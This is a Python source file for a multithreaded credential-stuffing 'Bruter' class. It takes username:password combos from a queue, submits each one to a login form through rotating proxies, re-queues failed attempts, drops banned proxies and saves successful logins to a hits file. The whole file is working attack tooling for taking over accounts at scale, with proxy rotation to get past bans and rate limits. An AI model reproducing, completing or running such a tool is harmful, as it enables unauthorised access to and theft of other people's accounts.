from .browser import Browser
from .const import (response_success, response_error)

from sys import path
from threading import Thread
from time import sleep
from http.client import RemoteDisconnected
from requests.exceptions import (ProxyError, ConnectionError, SSLError, HTTPError)
from socket import error as socket_error
from socket import timeout as socket_timeout
from ssl import SSLError as ssl_SSLError
from urllib3.exceptions import (MaxRetryError, TimeoutError, ReadTimeoutError)


class Bruter:

    def __init__(self, input_max_threads, input_hits_file, combo_queue, proxy_manager):
        self.combo_queue = combo_queue
        self.proxy_manager = proxy_manager
        self.hits = open(input_hits_file, 'a+', encoding='utf-8', errors='ignore')
        self.bots = []
        self.last_combo = ['', '']
        self.max_threads = input_max_threads
        self.tested = 0
        self.retries = 0
        self.isAlive = True

    def login(self, combo, proxy):
        try:
            browser = Browser()
            browser.create()
            browser.set_details(combo, proxy)
            browser.set_header()
            browser.build_payload()
            response = browser.post()

            if response.ok and response_error not in response.text:
                self.proxy_manager.disable(proxy, tested=True)
                self.tested += 1
                self.last_combo = combo
                if response_success in response.text:
                    self.hits.write(combo[0] + ':' + combo[1] + '\n')

            else:
                self.proxy_manager.disable(proxy, retries=True, ban_flag=True)
                self.combo_queue.appendleft(combo)
                self.retries += 1

        except (ConnectionAbortedError, ConnectionError, ConnectionRefusedError, ConnectionResetError,
                HTTPError, MaxRetryError, ProxyError, ReadTimeoutError, RemoteDisconnected, SSLError,
                TimeoutError, socket_error, socket_timeout, ssl_SSLError):

            self.proxy_manager.disable(proxy, retries=True, ban_flag=True)
            self.combo_queue.appendleft(combo)
            self.retries += 1

    def bot(self):
        while self.isAlive:
            try:
                combo = None
                proxy = None
                combo = self.combo_queue.popleft()
                proxy = self.proxy_manager.get()
                self.login(combo, proxy)

            except IndexError:
                if combo and not proxy:
                    self.combo_queue.appendleft(combo)

                sleep(0.5)

    def stop(self):
        self.isAlive = False
        for bot in self.bots:
            bot.join()

        self.hits.close()

    def start(self):
        for i in range(self.max_threads):
            t = Thread(target=self.bot)
            t.daemon = True
            t.start()
            self.bots.append(t)
